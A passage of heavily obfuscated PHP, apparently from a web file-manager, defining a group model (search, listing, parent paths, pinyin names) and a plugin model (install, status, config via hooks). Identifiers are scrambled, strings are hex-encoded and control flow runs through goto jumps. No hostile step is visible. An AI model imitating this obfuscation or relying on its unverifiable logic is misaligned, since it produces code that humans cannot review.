$E›—Áªˆ[$dÄ¡¿Èõ¼©[2014]] . $dÄ¡¿Èõ¼©[47]; goto eÈùç»Õ¼ô; B­©Ù«»Û: } public function setNamePinyin($A”¥è±ºÆ‡, $DğÖâ‹³êÉ = false) { $eÓ—¶Úùƒİ =& $_SERVER[ì‹É]; if (!$DğÖâ‹³êÉ) { $aÍÆˆ…¢” = $this->getInfoSimple($A”¥è±ºÆ‡); $DğÖâ‹³êÉ = $aÍÆˆ…¢”[$eÓ—¶Úùƒİ[28]]; } if (!Input::check($DğÖâ‹³êÉ, $eÓ—¶Úùƒİ[520])) { $this->metaSet($A”¥è±ºÆ‡, $eÓ—¶Úùƒİ[412], null); $this->metaSet($A”¥è±ºÆ‡, $eÓ—¶Úùƒİ[411], null); return; } $cğºº˜¥ = array($eÓ—¶Úùƒİ[412] => str_replace($eÓ—¶Úùƒİ[50], $eÓ—¶Úùƒİ[33], Pinyin::encode($DğÖâ‹³êÉ)), $eÓ—¶Úùƒİ[411] => Pinyin::encode($DğÖâ‹³êÉ, $eÓ—¶Úùƒİ[521])); $this->metaSet($A”¥è±ºÆ‡, $cğºº˜¥); } protected function groupRemove($Fò¹ÀóŒÌ¦) { goto e¯†‹ÃŠ; EÉâò¿§: if (!$B¬¥ÀŸñî || $B¬¥ÀŸñî[$AÜ†„í‘Î[457]] == 0) { return !1; } $b×ÁØƒíÍ¦ = $this->getInfoSimple($B¬¥ÀŸñî[$AÜ†„í‘Î[457]]); $this->_changeChildLevel($B¬¥ÀŸñî, $b×ÁØƒíÍ¦, !0); goto dƒÈ……ŸÉ; dƒÈ……ŸÉ: $this->where(array($AÜ†„í‘Î[457] => $Fò¹ÀóŒÌ¦))->save(array($AÜ†„í‘Î[457] => $B¬¥ÀŸñî[$AÜ†„í‘Î[457]])); Model($AÜ†„í‘Î[2089])->where($AÊÃ³Ÿ½ä)->delete(); Model($AÜ†„í‘Î[2090])->where($AÊÃ³Ÿ½ä)->delete(); goto AÙàå×ÀÇ£; e¯†‹ÃŠ: $AÜ†„í‘Î =& $_SERVER[ì‹É]; $AÊÃ³Ÿ½ä = array($AÜ†„í‘Î[2014] => $Fò¹ÀóŒÌ¦); $B¬¥ÀŸñî = $this->where($AÊÃ³Ÿ½ä)->find(); goto EÉâò¿§; AÙàå×ÀÇ£: Model($AÜ†„í‘Î[757])->groupRootRemove($Fò¹ÀóŒÌ¦); return $this->where($AÊÃ³Ÿ½ä)->delete(); goto d¾š„˜Ó®ë; d¾š„˜Ó®ë: } public function listData() { $b”¼Õ­Ìª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b”¼Õ­Ìª[$_SERVER[ì‹É][350]]); return $b”¼Õ­Ìª; } private function _makeOrder($aèôêœÙ = '') { goto CÓÆ»°¯ª•; e›Ãæˆ¸ï: $aèôêœÙ = $aèôêœÙ . "{$E¾Ëğ‚ÎÊÆ}\40{$CßÁ¤çñ÷}\x2c\x20\x67\x72\157\x75\160\x49\104\x20\141\x73\x63"; return $this->order($aèôêœÙ); goto e©±É¡‹; C®ÅÀ»åÊÆ: $E¾Ëğ‚ÎÊÆ = Input::get($Eß¦ Òß[403], $Eß¦ Òß[7], $Eß¦ Òß[2088], $fôï„ò‰¯ö); $CßÁ¤çñ÷ = Input::get($Eß¦ Òß[404], $Eß¦ Òß[7], $Eß¦ Òß[2091], array($Eß¦ Òß[2091], $Eß¦ Òß[400])); $CßÁ¤çñ÷ = $Bõ½ÜğÙÒÀ[$CßÁ¤çñ÷]; goto e›Ãæˆ¸ï; CÓÆ»°¯ª•: $Eß¦ Òß =& $_SERVER[ì‹É]; $fôï„ò‰¯ö = array($Eß¦ Òß[2014], $Eß¦ Òß[28], $Eß¦ Òß[2000], $Eß¦ Òß[184]); $Bõ½ÜğÙÒÀ = array($Eß¦ Òß[398] => $Eß¦ Òß[399], $Eß¦ Òß[400] => $Eß¦ Òß[401]); goto C®ÅÀ»åÊÆ; e©±É¡‹: } public function listChild($FÄË‹‡¡—) { $A¡Ëê¤î =& $_SERVER[ì‹É]; $aŞå»–Ÿ£ = $this->where(array($A¡Ëê¤î[457] => $FÄË‹‡¡—))->_makeOrder()->selectPage(200); $this->_listDataApply($aŞå»–Ÿ£[$A¡Ëê¤î[350]]); return $aŞå»–Ÿ£; } public function listByID($bÁŒÑ•ÔĞ˜) { $F¡£“±£è® =& $_SERVER[ì‹É]; if (!$bÁŒÑ•ÔĞ˜) { return array(); } $E¤…Úçñ„» = array($F¡£“±£è®[2014] => array($F¡£“±£è®[7], $bÁŒÑ•ÔĞ˜)); $fŒİĞ–¨­Ò = $this->where($E¤…Úçñ„»)->select(); $this->_listDataApply($fŒİĞ–¨­Ò); return $fŒİĞ–¨­Ò; } public function listSearch($F§‚ ¼¸…¯) { goto dâ¢ÛæÇÂ; F¦È«Ô»Ü¦: if (!trim($F˜œì“¹È½)) { return !1; } $F˜œì“¹È½ = str_replace($EŒ³œø¯È[2094], $EŒ³œø¯È[2095], $F˜œì“¹È½); $C¦¤æèàœ = array($EŒ³œø¯È[2014] => array($EŒ³œø¯È[756], "\45{$F˜œì“¹È½}\45"), $EŒ³œø¯È[28] => array($EŒ³œø¯È[756], "\x25{$F˜œì“¹È½}\x25"), $EŒ³œø¯È[911] => $EŒ³œø¯È[2096]); goto C‡‚«è°—¶; dâ¢ÛæÇÂ: $EŒ³œø¯È =& $_SERVER[ì‹É]; $F˜œì“¹È½ = $F§‚ ¼¸…¯[$EŒ³œø¯È[2092]]; $d‰‹ï˜óõ¥ = isset($F§‚ ¼¸…¯[$EŒ³œø¯È[2093]]) ? $F§‚ ¼¸…¯[$EŒ³œø¯È[2093]] : !1; goto F¦È«Ô»Ü¦; C‡‚«è°—¶: $C“ğÁ©ˆŠ× = $this->_makeOrder()->where($C¦¤æèàœ)->selectPage(20); $C“ğÁ©ˆŠ× = $C“ğÁ©ˆŠ× ? $C“ğÁ©ˆŠ× : array(); if (!$C“ğÁ©ˆŠ× || count($C“ğÁ©ˆŠ×[$EŒ³œø¯È[350]]) < 5 && Input::check($F˜œì“¹È½, $EŒ³œø¯È[303])) { $DÔç– Áˆâ = $this->_searchFromMeta($EŒ³œø¯È[411], $F˜œì“¹È½, 10); $FÊ©ß”Ú²¯ = $this->_searchFromMeta($EŒ³œø¯È[412], $F˜œì“¹È½, 10); $F„„‹ÏºÈ = array_merge($DÔç– Áˆâ, $FÊ©ß”Ú²¯, $C“ğÁ©ˆŠ×[$EŒ³œø¯È[350]]); $C“ğÁ©ˆŠ×[$EŒ³œø¯È[350]] = array_unique_by_key($F„„‹ÏºÈ, $EŒ³œø¯È[2014]); $C“ğÁ©ˆŠ×[$EŒ³œø¯È[347]][$EŒ³œø¯È[348]] = count($C“ğÁ©ˆŠ×[$EŒ³œø¯È[350]]); $C“ğÁ©ˆŠ×[$EŒ³œø¯È[347]][$EŒ³œø¯È[349]] = ceil($C“ğÁ©ˆŠ×[$EŒ³œø¯È[347]][$EŒ³œø¯È[348]] / $C“ğÁ©ˆŠ×[$EŒ³œø¯È[347]][$EŒ³œø¯È[345]]); } goto b‡õƒâºÉÅ; b‡õƒâºÉÅ: $this->_listDataApply($C“ğÁ©ˆŠ×[$EŒ³œø¯È[350]]); return $C“ğÁ©ˆŠ×; goto E½ğ…ª¹‡; E½ğ…ª¹‡: } private function _searchFromMeta($DÜÉâÓŞˆ, $aÂïÉ«™ğô, $c‹­Ş÷ÇÆ†) { goto c×ãÎßõ­¶; a£ÁšˆãÊ‰: $eøçˆÔá” = $this->where(array($aîäºŠ´·­[2088] => array($aîäºŠ´·­[7], $a‡‡ê´”ö)))->select(); if (!$eøçˆÔá”) { return array(); } return $eøçˆÔá”; goto e¡ĞµëÊ; c×ãÎßõ­¶: $aîäºŠ´·­ =& $_SERVER[ì‹É]; $aÂïÉ«™ğô = strtolower($aÂïÉ«™ğô); $Fíì›ñ‹Ù· = array($aîäºŠ´·­[90] => $DÜÉâÓŞˆ, $aîäºŠ´·­[354] => array($aîäºŠ´·­[756], "\45{$aÂïÉ«™ğô}\45")); goto eìæĞğ§î¯; eìæĞğ§î¯: $a‡‡ê´”ö = Model($aîäºŠ´·­[2097])->where($Fíì›ñ‹Ù·)->limit($c‹­Ş÷ÇÆ†)->select(); if (!$a‡‡ê´”ö) { return array(); } $a‡‡ê´”ö = array_to_keyvalue($a‡‡ê´”ö, $aîäºŠ´·­[33], $aîäºŠ´·­[2014]); goto a£ÁšˆãÊ‰; e¡ĞµëÊ: } protected function _listDataApplyItem($b²˜¦»±¢) { $FŒØÎ²É­ã = array($b²˜¦»±¢); $this->_listDataApply($FŒØÎ²É­ã); return $FŒØÎ²É­ã[0]; } protected function _listDataApply(&$C‹˜ù÷Ÿ) { goto fÎÄàÊ‹Ç; d©ÖÛ×• µ: $this->_listAppendChildren($C‹˜ù÷Ÿ); $this->_listAppendChildrenMember($C‹˜ù÷Ÿ); $this->_listAppendMeta($C‹˜ù÷Ÿ, $AŠ•¥“ÖŸ˜); goto AêĞóùƒñ; AêĞóùƒñ: $this->_listAppendParent($C‹˜ù÷Ÿ); $this->_listAppendSourceRoot($C‹˜ù÷Ÿ, $AŠ•¥“ÖŸ˜); goto a±µ¹ó»‰; fÎÄàÊ‹Ç: $BÑùï¹‚ÁÉ =& $_SERVER[ì‹É]; if (!$C‹˜ù÷Ÿ) { return; } $AŠ•¥“ÖŸ˜ = array_to_keyvalue($C‹˜ù÷Ÿ, $BÑùï¹‚ÁÉ[33], $BÑùï¹‚ÁÉ[2014]); goto d©ÖÛ×• µ; a±µ¹ó»‰: } private function _listAppendChildren(&$B…“½œ÷ù£) { goto a¿Œ­ö›òœ; a¿Œ­ö›òœ: $Fà¹ÊÎÀëƒ =& $_SERVER[ì‹É]; $AÔÌ‰èÒŸ¬ = $Fà¹ÊÎÀëƒ[358]; $b­Ûİ¢Œ‡» = array(); goto eèÀ¥ê¦æ; eèÀ¥ê¦æ: $b“½éàÌÄç = count($B…“½œ÷ù£); $eÃ‚È¸¶™‰ = $this->tablePrefix . $this->tableName; for ($eÄèë¬ÌÀ† = 0, $DÅˆÜî = 0; $eÄèë¬ÌÀ† < $b“½éàÌÄç; $eÄèë¬ÌÀ†++) { $DÅˆÜî++; $C©ö¬½í•“ = $B…“½œ÷ù£[$eÄèë¬ÌÀ†][$Fà¹ÊÎÀëƒ[2014]]; $AÔÌ‰èÒŸ¬ .= "\123\105\x4c\x45\103\124\x20\x2a\40\106\x52\x4f\115\40\x28\123\x45\114\105\103\124\40\x27{$C©ö¬½í•“}\137\x63\150\151\154\144\x27\x20\x61\x73\40\x68\x61\163\x20\x46\x52\x4f\x4d\x20\140{$eÃ‚È¸¶™‰}\x60\x20\x77\150\x65\x72\145\40\x70\141\x72\x65\156\164\111\104\x3d{$C©ö¬½í•“}\40\x6c\151\x6d\x69\x74\40\x31\x29\x20\141\163\x20\164\142\x5f{$C©ö¬½í•“}\x20\x75\156\x69\x6f\156\x20\x61\154\154\x20"; if (($DÅˆÜî >= 20 || $eÄèë¬ÌÀ† == $b“½éàÌÄç - 1) && $AÔÌ‰èÒŸ¬) { $AÔÌ‰èÒŸ¬ = substr($AÔÌ‰èÒŸ¬, 0, -strlen($Fà¹ÊÎÀëƒ[445])); $c×—áŒÅñ = $this->query($AÔÌ‰èÒŸ¬); $b­Ûİ¢Œ‡» = array_merge($b­Ûİ¢Œ‡», $c×—áŒÅñ); $DÅˆÜî = 0; $AÔÌ‰èÒŸ¬ = $Fà¹ÊÎÀëƒ[33]; } } goto E‚…ëğ‹“; E‚…ëğ‹“: $b­Ûİ¢Œ‡» = array_to_keyvalue($b­Ûİ¢Œ‡», $Fà¹ÊÎÀëƒ[446]); foreach ($B…“½œ÷ù£ as &$fğÔØé¿ƒ¶) { $fğÔØé¿ƒ¶[$Fà¹ÊÎÀëƒ[2098]] = isset($b­Ûİ¢Œ‡»[$fğÔØé¿ƒ¶[$Fà¹ÊÎÀëƒ[2014]] . $Fà¹ÊÎÀëƒ[2099]]); } goto E„×ÖÅ§‹œ; E„×ÖÅ§‹œ: } private function _listAppendChildrenMember(&$aá™²Í–Û) { goto C›·‡İö©; bí†¤˜Ì: $E‡š«‘‡¹ = count($aá™²Í–Û); $EÈ–ĞÉì« = $this->tablePrefix . $e’ØâÙªÊ˜[2090]; for ($Cà†¾âîãÖ = 0, $dœ‚œØ¨ˆ… = 0; $Cà†¾âîãÖ < $E‡š«‘‡¹; $Cà†¾âîãÖ++) { $dœ‚œØ¨ˆ…++; $bê¬ŞÂÀö× = $aá™²Í–Û[$Cà†¾âîãÖ][$e’ØâÙªÊ˜[2014]]; $càá¡ªÃÈÂ .= "\x53\x45\x4c\x45\x43\x54\x20\x2a\40\x46\122\117\115\x20\x28\123\x45\x4c\105\x43\x54\x20\x27{$bê¬ŞÂÀö×}\x5f\143\x68\x69\154\144\x27\40\x61\163\x20\150\141\163\x20\106\x52\117\x4d\x20\x60{$EÈ–ĞÉì«}\140\40\x77\x68\x65\x72\x65\40\147\x72\157\165\x70\x49\104\x3d{$bê¬ŞÂÀö×}\x20\154\x69\155\151\x74\x20\x31\x29\40\141\x73\40\x74\142\137{$bê¬ŞÂÀö×}\40\x75\x6e\151\157\156\40\x61\154\154\x20"; if (($dœ‚œØ¨ˆ… >= 20 || $Cà†¾âîãÖ == $E‡š«‘‡¹ - 1) && $càá¡ªÃÈÂ) { $càá¡ªÃÈÂ = substr($càá¡ªÃÈÂ, 0, -strlen($e’ØâÙªÊ˜[445])); $D˜ŞÆÆ‘… = $this->query($càá¡ªÃÈÂ); $FÎïÄº®ó = array_merge($FÎïÄº®ó, $D˜ŞÆÆ‘…); $dœ‚œØ¨ˆ… = 0; $càá¡ªÃÈÂ = $e’ØâÙªÊ˜[33]; } } goto aÌ·Üå®Å; aÌ·Üå®Å: $FÎïÄº®ó = array_to_keyvalue($FÎïÄº®ó, $e’ØâÙªÊ˜[446]); foreach ($aá™²Í–Û as &$d¥ã‘ÇÙÇĞ) { $d¥ã‘ÇÙÇĞ[$e’ØâÙªÊ˜[2100]] = isset($FÎïÄº®ó[$d¥ã‘ÇÙÇĞ[$e’ØâÙªÊ˜[2014]] . $e’ØâÙªÊ˜[2099]]); } goto DäÃôÆÃ¾; C›·‡İö©: $e’ØâÙªÊ˜ =& $_SERVER[ì‹É]; $càá¡ªÃÈÂ = $e’ØâÙªÊ˜[358]; $FÎïÄº®ó = array(); goto bí†¤˜Ì; DäÃôÆÃ¾: } private function _listAppendMeta(&$c¯›ßçÄ¼Î, $c—±öÙ”ã) { $Böİå³ïº =& $_SERVER[ì‹É]; $B¿ì‘öíà = array($Böİå³ïº[2014] => array($Böİå³ïº[7], $c—±öÙ”ã)); $FŠ—˜’îò³ = Model($Böİå³ïº[2089])->where($B¿ì‘öíà)->select(); $FŠ—˜’îò³ = array_to_keyvalue_group($FŠ—˜’îò³, $Böİå³ïº[2014]); foreach ($FŠ—˜’îò³ as &$eâ¸³™„‹É) { $eâ¸³™„‹É = array_to_keyvalue($eâ¸³™„‹É, $Böİå³ïº[90], $Böİå³ïº[354]); } foreach ($c¯›ßçÄ¼Î as &$a±ø¦©Ù™…) { $a±ø¦©Ù™…[$Böİå³ïº[413]] = array(); if (isset($FŠ—˜’îò³[$a±ø¦©Ù™…[$Böİå³ïº[2014]]])) { $a±ø¦©Ù™…[$Böİå³ïº[413]] = $FŠ—˜’îò³[$a±ø¦©Ù™…[$Böİå³ïº[2014]]]; } } } protected function parentLevelArray($DÚÉ¼±×ƒÄ) { $c¹¾ôâ“ÔÈ =& $_SERVER[ì‹É]; $DÚÉ¼±×ƒÄ = explode($c¹¾ôâ“ÔÈ[47], trim($DÚÉ¼±×ƒÄ, $c¹¾ôâ“ÔÈ[47])); $DÚÉ¼±×ƒÄ = array_remove_value($DÚÉ¼±×ƒÄ, $c¹¾ôâ“ÔÈ[464]); return $DÚÉ¼±×ƒÄ; } private function _listAppendParent(&$BâÉßµšŠ¨) { goto b†÷×ªç¤ï; FÏº¸Şİ©÷: $D…›‘·Õ¥¦ = array(); foreach ($BìÎ„¤ÑÎ as $eƒ¨ˆì¬£· => $eßŠÊİ‚ÁØ) { if (!$eßŠÊİ‚ÁØ) { $D…›‘·Õ¥¦[] = $eƒ¨ˆì¬£·; } } if ($D…›‘·Õ¥¦) { $AËë¦Ì‰Ë = array($fèáïš†İÆ[2088] => array($fèáïš†İÆ[381], $D…›‘·Õ¥¦)); $dˆÇŸŞ‚°Ô = $this->field($fèáïš†İÆ[2101])->where($AËë¦Ì‰Ë)->select(); $f‚‡Óì–¾í = array_to_keyvalue($dˆÇŸŞ‚°Ô, $fèáïš†İÆ[2014], $fèáïš†İÆ[28]); $BìÎ„¤ÑÎ = array_merge_index($BìÎ„¤ÑÎ, $f‚‡Óì–¾í); } goto CßÌÄÉò¦®; CßÌÄÉò¦®: foreach ($BâÉßµšŠ¨ as &$A£÷à˜Š‡ß) { $B¨†ßŸ“’Í = $this->parentLevelArray($A£÷à˜Š‡ß[$fèáïš†İÆ[455]]); $F‡ğ›Œ”¯‹ = $fèáïš†İÆ[33]; foreach ($B¨†ßŸ“’Í as $a¯ÛáÎµÉÚ) { $F‡ğ›Œ”¯‹ .= $BìÎ„¤ÑÎ[$a¯ÛáÎµÉÚ] . $fèáïš†İÆ[8]; } if ($B¨†ßŸ“’Í) { $F‡ğ›Œ”¯‹ .= $A£÷à˜Š‡ß[$fèáïš†İÆ[28]]; } $A£÷à˜Š‡ß[$fèáïš†İÆ[459]] = str_replace($fèáïš†İÆ[463], $fèáïš†İÆ[8], $F‡ğ›Œ”¯‹); } goto bÂÖÓ‰†¤â; b†÷×ªç¤ï: $fèáïš†İÆ =& $_SERVER[ì‹É]; $BìÎ„¤ÑÎ = array(); foreach ($BâÉßµšŠ¨ as &$A£÷à˜Š‡ß) { $BìÎ„¤ÑÎ[$A£÷à˜Š‡ß[$fèáïš†İÆ[2014]]] = $A£÷à˜Š‡ß[$fèáïš†İÆ[28]]; $B¨†ßŸ“’Í = $this->parentLevelArray($A£÷à˜Š‡ß[$fèáïš†İÆ[455]]); foreach ($B¨†ßŸ“’Í as $a¯ÛáÎµÉÚ) { if (!isset($BìÎ„¤ÑÎ[$a¯ÛáÎµÉÚ])) { $BìÎ„¤ÑÎ[$a¯ÛáÎµÉÚ] = 0; } } } goto FÏº¸Şİ©÷; bÂÖÓ‰†¤â: } private function _listAppendSourceRoot(&$DÎ†ïõùæŸ, $FÏÅÁÛ§–) { goto CÍ³ÕÔåÌ; E‹¸â”Ìİ: foreach ($DÎ†ïõùæŸ as &$EİÆÁ‡¦ªÅ) { $EİÆÁ‡¦ªÅ[$CÔÑ©ÒÒ¢[388]] = $Dòù…½ËÅç[$EİÆÁ‡¦ªÅ[$CÔÑ©ÒÒ¢[2014]]] ? $Dòù…½ËÅç[$EİÆÁ‡¦ªÅ[$CÔÑ©ÒÒ¢[2014]]] : array(); } goto f°ŒÜ°ÛÍĞ; fÄ¦È¸«…Ò: $Dòù…½ËÅç = Model($CÔÑ©ÒÒ¢[757])->order($CÔÑ©ÒÒ¢[2103])->field($aÓ‚Í¡´)->where($eõµ®”“±Ë)->select(); $Dòù…½ËÅç = array_to_keyvalue($Dòù…½ËÅç, $CÔÑ©ÒÒ¢[452]); $Dòù…½ËÅç = array_remove_key($Dòù…½ËÅç, $CÔÑ©ÒÒ¢[452]); goto E‹¸â”Ìİ; CÍ³ÕÔåÌ: $CÔÑ©ÒÒ¢ =& $_SERVER[ì‹É]; $eõµ®”“±Ë = array($CÔÑ©ÒÒ¢[368] => SourceModel::TYPE_GROUP, $CÔÑ©ÒÒ¢[457] => 0, $CÔÑ©ÒÒ¢[452] => array($CÔÑ©ÒÒ¢[7], $FÏÅÁÛ§–)); $aÓ‚Í¡´ = $CÔÑ©ÒÒ¢[2102]; goto fÄ¦È¸«…Ò; f°ŒÜ°ÛÍĞ: } protected function resetParentLevel() { $BõÃ§§¼Ø¦ =& $_SERVER[ì‹É]; $bïÚĞåËœ = $BõÃ§§¼Ø¦[2014]; $AÒŒèğÏÃ˜ = $this->select(); $AÒŒèğÏÃ˜ = array_to_keyvalue($AÒŒèğÏÃ˜, $bïÚĞåËœ); foreach ($AÒŒèğÏÃ˜ as $C‹¾ÂâÙÓÅ) { goto döğÙ¾Èì; dà¬©æœÈõ: $this->where(array($bïÚĞåËœ => $C‹¾ÂâÙÓÅ[$bïÚĞåËœ]))->save(array($BõÃ§§¼Ø¦[517] => $b’İÀ¨ë‚ƒ)); goto aĞä†Ö°ªã; A÷«—Û‰öè: $b’İÀ¨ë‚ƒ[] = 0; $b’İÀ¨ë‚ƒ = $BõÃ§§¼Ø¦[47] . implode($BõÃ§§¼Ø¦[47], array_reverse($b’İÀ¨ë‚ƒ)) . $BõÃ§§¼Ø¦[47]; $this->setNamePinyin($C‹¾ÂâÙÓÅ[$bïÚĞåËœ], $C‹¾ÂâÙÓÅ[$BõÃ§§¼Ø¦[28]]); goto dà¬©æœÈõ; döğÙ¾Èì: $fŠ”¯ï†„á = $C‹¾ÂâÙÓÅ; $b’İÀ¨ë‚ƒ = array(); while ($fŠ”¯ï†„á[$BõÃ§§¼Ø¦[457]] != 0) { $b’İÀ¨ë‚ƒ[] = $fŠ”¯ï†„á[$BõÃ§§¼Ø¦[457]]; $fŠ”¯ï†„á = $AÒŒèğÏÃ˜[$fŠ”¯ï†„á[$BõÃ§§¼Ø¦[457]]]; } goto A÷«—Û‰öè; aĞä†Ö°ªã: } return $AÒŒèğÏÃ˜; } public function groupNameAuto($AÊ‚…ÍÅ…š, $E¿—–àâØ) { $C¥õÖàªä =& $_SERVER[ì‹É]; $eÏñÇ†ßƒ¤ = $this->where(array($C¥õÖàªä[365] => $AÊ‚…ÍÅ…š))->getField($C¥õÖàªä[28], !0); if (!$eÏñÇ†ßƒ¤ || !in_array($E¿—–àâØ, $eÏñÇ†ßƒ¤)) { return $E¿—–àâØ; } for ($eÔß¢ÅÇêí = 1; $eÔß¢ÅÇêí <= count($eÏñÇ†ßƒ¤) + 1; $eÔß¢ÅÇêí++) { $b™êœ„‚ß = $E¿—–àâØ . "\50{$eÔß¢ÅÇêí}\51"; if (!in_array($b™êœ„‚ß, $eÏñÇ†ßƒ¤)) { return $b™êœ„‚ß; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x70\x6c\x75\147\x69\x6e\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x61\164\165\163", "\162\145\147\x69\145\x73\164", "\x63\157\x6e\x66\151\x67"); public function loadList($Eóöö¦Ş = false) { $f­ø’˜Ç = array_to_keyvalue($this->listData(), $_SERVER[ì‹É][28]); if ($Eóöö¦Ş) { return $f­ø’˜Ç[$Eóöö¦Ş]; } return $f­ø’˜Ç; } public function init() { $fêÇåÕÅÓ =& $_SERVER[ì‹É]; Hook::trigger($fêÇåÕÅÓ[2104]); $Bİä‘Áè™… = $this->loadPluginList(); foreach ($Bİä‘Áè™… as $cÕÚÙ¤±©¦ => $E£‘Îš‚ŞÅ) { $aïö¡ÓÊ = $this->appAllow($cÕÚÙ¤±©¦, $E£‘Îš‚ŞÅ); if (!$aïö¡ÓÊ) { continue; } foreach ($E£‘Îš‚ŞÅ[$fêÇåÕÅÓ[2105]] as $EÆ¼îŞ­’’ => $AÂˆÅóéÑ) { Hook::bind($EÆ¼îŞ­’’, $AÂˆÅóéÑ); } } Hook::trigger($fêÇåÕÅÓ[2106]); Hook::trigger(ACTION); } public function appAllow($Dù›ôÄùÔ¦, $d»¹ÄÁ¦…ƒ, $A˜˜„˜¹ÊŒ = true) { $b÷Ö´ºÖ­ =& $_SERVER[ì‹É]; $fˆ«»îëòÁ = PLUGIN_DIR . $Dù›ôÄùÔ¦ . $b÷Ö´ºÖ­[2107]; if (!is_array($d»¹ÄÁ¦…ƒ) || !is_array($d»¹ÄÁ¦…ƒ[$b÷Ö´ºÖ­[2105]]) || !is_file($fˆ«»îëòÁ) || $d»¹ÄÁ¦…ƒ[$b÷Ö´ºÖ­[676]] != 1) { return !1; } if ($A˜˜„˜¹ÊŒ && !Action($b÷Ö´ºÖ­[2108])->checkAuth($Dù›ôÄùÔ¦)) { return !1; } return !0; } public function unInstall($FÀ¾Õºïçâ) { $Fæğ†¸¼æŠ =& $_SERVER[ì‹É]; $cÊÎ·ïÜ—« = $this->loadList($FÀ¾Õºïçâ); if (file_exists(PLUGIN_DIR . $FÀ¾Õºïçâ)) { Hook::apply($FÀ¾Õºïçâ . $Fæğ†¸¼æŠ[2109]); } $this->remove($cÊÎ·ïÜ—«[$Fæğ†¸¼æŠ[364]]); } public function changeStatus($EØÊÍ¢ç„Ä, $aµ–¯•È¯Õ) { $eÈôé¤©’‹ =& $_SERVER[ì‹É]; $eÉ¥¡ÄÙğƒ = $this->loadList($EØÊÍ¢ç„Ä); if ($aµ–¯•È¯Õ) { Hook::apply($EØÊÍ¢ç„Ä . $eÈôé¤©’‹[2110]); } $this->update($eÉ¥¡ÄÙğƒ[$eÈôé¤©’‹[364]], array($eÈôé¤©’‹[2111] => $aµ–¯•È¯Õ)); } public function appRegist($BÅ³¯ïù·, $Aàš›İÈÖ) { $Cá©ŞÈÄÕ =& $_SERVER[ì‹É]; $aº¡ªÊÆö£ = $this->loadList($BÅ³¯ïù·); if ($aº¡ªÊÆö£) { $this->update($aº¡ªÊÆö£[$Cá©ŞÈÄÕ[364]], array($Cá©ŞÈÄÕ[2105] => $Aàš›İÈÖ)); } else { $dÎª›…‹Ú¼ = array($Cá©ŞÈÄÕ[28] => $BÅ³¯ïù·, $Cá©ŞÈÄÕ[2105] => $Aàš›İÈÖ, $Cá©ŞÈÄÕ[676] => 0, $Cá©ŞÈÄÕ[6] => $this->getConfigDefault($BÅ³¯ïù·)); $this->insert($dÎª›…‹Ú¼); } } public function getConfigDefault($f„İ¤ØÊó÷) { $FŸˆ¶÷Òô =& $_SERVER[ì‹É]; $AäÁµÉŠ = array(); $a®Ïªæ¸÷ = $this->getPackageJson($f„İ¤ØÊó÷); if (!$a®Ïªæ¸÷ && is_array($a®Ïªæ¸÷[$FŸˆ¶÷Òô[2112]])) { return $AäÁµÉŠ; } foreach ($a®Ïªæ¸÷[$FŸˆ¶÷Òô[2112]] as $Fê¹Í‘‘ŸË => $DóÀÍ¯ïé‹) { if (!isset($DóÀÍ¯ïé‹[$FŸˆ¶÷Òô[354]]) || isset($AäÁµÉŠ[$Fê¹Í‘‘ŸË])) { continue; } $AäÁµÉŠ[$Fê¹Í‘‘ŸË] = $DóÀÍ¯ïé‹[$FŸˆ¶÷Òô[354]]; } return $AäÁµÉŠ; } public function getPackageJson($Aè½·ù’‘ê) { return Hook::apply($Aè½·ù’‘ê . $_SERVER[ì‹É][2113]); } public function getConfig($Aë‰Í¶ØğÃ, $Eß…¤‹¡Ó = false) { $fÒó‡Œ§Ü¢ =& $_SERVER[ì‹É]; $aœ›‰¸Ô¹ = array(); $e‚ô„¶õí§ = $this->loadList($Aë‰Í¶ØğÃ); if ($e‚ô„¶õí§ && is_array($e‚ô„¶õí§[$fÒó‡Œ§Ü¢[6]])) { $aœ›‰¸Ô¹ = $e‚ô„¶õí§[$fÒó‡Œ§Ü¢[6]]; } if (!$aœ›‰¸Ô¹ || $Eß…¤‹¡Ó) { $aœ›‰¸Ô¹ = $this->getConfigDefault($Aë‰Í¶ØğÃ); } return $aœ›‰¸Ô¹; } public function setConfig($Aã¤‘º®ì, $a²Šµ× = false) { goto b•‡ÉÆ—–; CË¡ö’“²‡: if ($a²Šµ× == !1) { $a²Šµ× = $this->getConfigDefault($Aã¤‘º®ì); } $b‹²íÖ¥ßÑ = $dÜÜ·¢­ùº[$F«’÷¬‚£ä[6]]; foreach ($a²Šµ× as $dÊé¢÷Ó’… => $DÍÜ”·Ü³‰) { $b‹²íÖ¥ßÑ[$dÊé¢÷Ó’…] = is_string($DÍÜ”·Ü³‰) ? trim($DÍÜ”·Ü³‰) : $DÍÜ”·Ü³‰; } goto eÜÍ˜İ´¢; eÜÍ˜İ´¢: $this->update($dÜÜ·¢­ùº[$F«’÷¬‚£ä[364]], array($F«’÷¬‚£ä[6] => $b‹²íÖ¥ßÑ)); goto CÉñöã‚æ˜; b•‡ÉÆ—–: $F«’÷¬‚£ä =& $_SERVER[ì‹É]; $dÜÜ·¢­ùº = $this->loadList($Aã¤‘º®ì); if (!$dÜÜ·¢­ùº) { return !1; } goto CË¡ö’“²‡; CÉñöã‚æ˜: } public function viewList() { goto FÂ‡õÂ‚·±; a–¨÷‚Àï®: return $D·ñò§Ï³‘; goto aéà„ŠÇ™Õ; d¦ÉÍÒ„Ÿ‡: $DÙ±‰ö­øç = $this->loadPluginList(); $D·ñò§Ï³‘ = array(); foreach ($DÙ±‰ö­øç as $f‹™•Í½¡ => $aÒ‚‘­ŒÜÉ) { unset($aÒ‚‘­ŒÜÉ[$AàÕ‡†¢Æ¿[2105]], $aÒ‚‘­ŒÜÉ[$AàÕ‡†¢Æ¿[6]]); $a„ø‰ÍÍóé = PLUGIN_DIR . $aÒ‚‘­ŒÜÉ[$AàÕ‡†¢Æ¿[28]] . $AàÕ‡†¢Æ¿[2107]; if (!is_file($a„ø‰ÍÍóé)) { continue; } $e—‰®Á¤Ÿ¦ = Hook::apply($aÒ‚‘­ŒÜÉ[$AàÕ‡†¢Æ¿[28]] . $AàÕ‡†¢Æ¿[2113]); if (is_array($e—‰®Á¤Ÿ¦)) { $D·ñò§Ï³‘[$f‹™•Í½¡] = array_merge($aÒ‚‘­ŒÜÉ, $e—‰®Á¤Ÿ¦); } } goto a–¨÷‚Àï®; FÂ‡õÂ‚·±: $AàÕ‡†¢Æ¿ =& $_SERVER[ì‹É]; 